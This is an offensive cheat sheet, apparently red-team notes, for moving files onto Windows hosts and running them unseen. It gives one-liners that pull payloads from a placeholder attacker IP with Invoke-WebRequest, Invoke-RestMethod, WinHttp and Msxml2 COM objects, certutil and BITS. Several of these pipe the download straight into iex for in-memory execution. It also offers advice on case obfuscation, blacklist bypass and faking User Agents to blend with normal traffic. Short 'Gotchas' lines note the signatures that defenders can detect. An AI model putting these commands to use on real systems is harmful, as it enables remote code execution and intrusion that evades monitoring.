1. Audit target for command-line logging; if present, apply **case obfuscation** to bypass basic blacklists.
2. Identify the environment's legitimate traffic profile to select a transfer tool with a matching **User Agent**.
3. Execute the transfer using the method that blends with existing system processes (e.g., BITS for update-heavy environments or Msxml2 for IE-reliant apps).

---

## PowerShell Native Transfers

Standard PowerShell execution permitted and version-specific identification is acceptable.

Standard file download and save

```
Invoke-WebRequest http://<ATTACK_IP>/<FILE_PATH> -OutFile "<FILE_PATH>"
```

Alternative cmdlet for file retrieval

```
Invoke-RestMethod http://<ATTACK_IP>/<FILE_PATH> -OutFile "<FILE_PATH>"
```

- Tool comparison
    
    - `Invoke-WebRequest` → `Invoke-WebRequest -OutFile` → Use for general file downloads.
    - `Invoke-RestMethod` → `Invoke-RestMethod -OutFile` → Use when standard web requests are monitored differently.
- Gotchas **User Agent analysis** specifically reveals the PowerShell version (e.g., WindowsPowerShell/5.1.14393.0) to defenders.
    

## WinHttp COM Object

Bypassing cmdlet-specific monitoring while utilizing a "compatible" browser User Agent.

Initialize COM object and execute in-memory

```
$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://<ATTACK_IP>/<FILE_PATH>',$false); $h.send(); iex $h.ResponseText
```

- Gotchas **User Agent string** explicitly identifies the use of the WinHttp.WinHttpRequest.5 library.

## Msxml2 COM Object

Mimicking legacy Internet Explorer (MSIE 7.0) traffic to blend with older enterprise software signatures.

Download and execute via Msxml2

```
$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://<ATTACK_IP>/<FILE_PATH>',$false); $h.send(); iex $h.responseText
```

- Gotchas **Header density** including UA-CPU and Trident versions provides a high-fidelity signature for SIEM alerting.

## Certutil Living off the Land

PowerShell is restricted/monitored and transfers must occur through native Windows binaries.

Standard certutil download

```
certutil -urlcache -split -f http://<ATTACK_IP>/<FILE_PATH> <FILE_PATH>
```

Alternative certutil verb to bypass simple string matching

```
certutil -verifyctl -split -f http://<ATTACK_IP>/<FILE_PATH> <FILE_PATH>
```

- Gotchas **Microsoft-CryptoAPI** User Agent is a unique identifier for certutil-based web traffic.

## BITS Transfer

Mimicking background system administrative tasks or update services.

Import module and execute one-liner transfer

```
Import-Module bitstransfer; Start-BitsTransfer 'http://<ATTACK_IP>/<FILE_PATH>' <FILE_PATH>; $r=gc <FILE_PATH>; rm <FILE_PATH>; iex $r
```

- Gotchas **Microsoft BITS** User Agent and the use of HEAD requests instead of GET are immediate anomalies in non-update traffic.